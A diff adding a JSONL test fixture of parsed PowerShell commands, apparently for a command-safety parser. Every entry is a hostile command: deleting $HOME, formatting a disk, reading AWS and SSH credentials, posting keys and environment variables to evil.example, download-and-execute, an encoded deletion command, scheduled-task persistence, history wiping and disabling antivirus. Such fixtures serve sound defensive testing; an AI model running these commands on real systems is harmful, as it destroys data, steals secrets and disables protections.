@@ -1,0 +1,12 @@
+{"id":"00-home-delete","parse_errors":[],"commands":[{"name":"Remove-Item","op":"","params":["-recurse","-force"],"args":["$HOME"]}],"strings":[]}
+{"id":"01-format-disk","parse_errors":[],"commands":[{"name":"Format-Volume","op":"","params":["-driveletter","-force"],"args":["D"]}],"strings":[]}
+{"id":"02-cred-read","parse_errors":[],"commands":[{"name":"Get-Content","op":"","params":[],"args":["$env:USERPROFILE\\.aws\\credentials"]}],"strings":[]}
+{"id":"03-key-exfil","parse_errors":[],"commands":[{"name":"Invoke-WebRequest","op":"","params":["-uri","-method","-infile"],"args":["https://evil.example/u","Post","$HOME\\.ssh\\id_rsa"]}],"strings":[]}
+{"id":"04-env-exfil","parse_errors":[],"commands":[{"name":"Get-ChildItem","op":"","params":[],"args":["env:"]},{"name":"Out-String","op":"","params":[],"args":[]},{"name":"Invoke-RestMethod","op":"","params":["-uri","-method"],"args":["https://evil.example/e","Post"]}],"strings":[]}
+{"id":"05-download-exec","parse_errors":[],"commands":[{"name":"iex","op":"","params":[],"args":["<expr>"]},{"name":"iwr","op":"","params":["-usebasicparsing"],"args":["https://evil.example/x.ps1"]}],"strings":[]}
+{"id":"06-encoded-cmd","parse_errors":[],"commands":[{"name":"powershell","op":"","params":["-encodedcommand"],"args":["UgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBSAGUAYwB1AHIAcwBlACAALQBGAG8AcgBjAGUAIABDADoAXABVAHMAZQByAHMAXABhAGwAaQBjAGUA"]}],"strings":[]}
+{"id":"07-sched-persist","parse_errors":[],"commands":[{"name":"schtasks","op":"","params":[],"args":["/create","/tn","upd","/tr","powershell -c iwr https://evil.example","/sc","minute"]}],"strings":[]}
+{"id":"08-history-wipe","parse_errors":[],"commands":[{"name":"Remove-Item","op":"","params":[],"args":["<expr>"]},{"name":"Get-PSReadlineOption","op":"","params":[],"args":[]}],"strings":[]}
+{"id":"09-disable-av","parse_errors":[],"commands":[{"name":"Set-MpPreference","op":"","params":["-disablerealtimemonitoring"],"args":["$true"]}],"strings":[]}
+{"id":"10-fork-bomb","parse_errors":[],"commands":[{"name":"Start-Process","op":"","params":[],"args":["powershell"]}],"strings":[]}
+{"id":"11-key-read","parse_errors":[],"commands":[{"name":"type","op":"","params":[],"args":["$env:USERPROFILE\\.ssh\\id_rsa"]}],"strings":[]}
